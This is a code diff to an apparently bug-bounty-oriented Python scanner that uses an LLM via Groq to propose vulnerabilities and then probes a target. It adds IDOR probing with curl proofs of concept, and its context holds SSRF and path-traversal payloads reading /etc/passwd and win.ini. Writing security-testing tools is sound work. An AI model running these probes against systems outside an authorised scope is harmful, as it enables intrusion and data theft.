@@ -56,6 +56,9 @@ PAYLOADS = {
         "http://localhost:8080",
         "http://127.0.0.1/admin",
     ],
+    "idor": [
+        "1", "2", "0", "9999", "../1",
+    ],
     "lfi": [
         "../../../etc/passwd",
         "..\\..\\..\\windows\\win.ini",
@@ -304,13 +307,13 @@ Top 15 hypotheses only. ONLY JSON."""
     
     try:
         print("[*] Calling Groq API (free tier)...")
-        response = client.messages.create(
-            model="mixtral-8x7b-32768",
+        response = client.chat.completions.create(
+            model="llama3-70b-8192",
             messages=[{"role": "user", "content": prompt}],
             max_tokens=2000,
         )
         
-        text = response.content[0].text.strip()
+        text = response.choices[0].message.content.strip()
         
         # Extract JSON
         start = text.find("[")
@@ -337,7 +340,7 @@ async def test_vuln(target: str, hyp: Dict) -> Dict:
     vuln_type = hyp.get("vuln_type", "unknown")
     method = hyp.get("method", "GET").upper()
     
-    url = f"https://{target}{endpoint}"
+    url = f"https://{target}{endpoint}" if not target.startswith("http") else f"{target.rstrip('/')}{endpoint}"
     
     result = {
         "endpoint": endpoint,
@@ -394,6 +397,15 @@ async def test_vuln(target: str, hyp: Dict) -> Dict:
                     result["response_sample"] = r.text[:300]
                     break
             
+            elif vuln_type.lower() == "idor":
+                # Look for 200 OK with different IDs returning data that looks like user/account info
+                if r.status_code == 200 and any(x in r.text.lower() for x in ["email", "user", "account", "id", "profile"]):
+                    result["vulnerable"] = True
+                    result["payload"] = payload
+                    result["poc"] = f"curl '{url}?id={payload}'"
+                    result["response_sample"] = r.text[:300]
+                    break
+
             elif vuln_type.lower() == "lfi":
                 if any(x in r.text for x in ["root:", "bin:", "etc/passwd", "windows"]):
                     result["vulnerable"] = True
@@ -555,7 +567,7 @@ def generate_report(target: str, vulns: List[Dict]) -> str:
                 <div class="label">Critical</div>
             </div>
             <div class="stat-box">
-                <div class="number">{int(time.time())}</div>
+                <div class="number" style="font-size:1em;">{time.strftime('%Y-%m-%d %H:%M')}</div>
                 <div class="label">Scan Time</div>
             </div>
         </div>
@@ -652,13 +664,20 @@ Set environment:
             print("Usage: python3 bughunt_groq.py hunt <target> [scope.txt]")
             sys.exit(1)
         
-        target = sys.argv[2]
+        raw_target = sys.argv[2]
+        # Strip scheme — subfinder/naabu/waybackurls need bare domain
+        if "://" in raw_target:
+            from urllib.parse import urlparse
+            parsed = urlparse(raw_target)
+            target = parsed.netloc or parsed.path
+        else:
+            target = raw_target
         scope_file = sys.argv[3] if len(sys.argv) > 3 else None
         
         if scope_file and os.path.exists(scope_file):
             scope = open(scope_file).read()
         else:
-            scope = target
+            scope = target  # bare domain now, so filter works correctly
         
         print(f"""
 ╔═══════════════════════════════════════╗
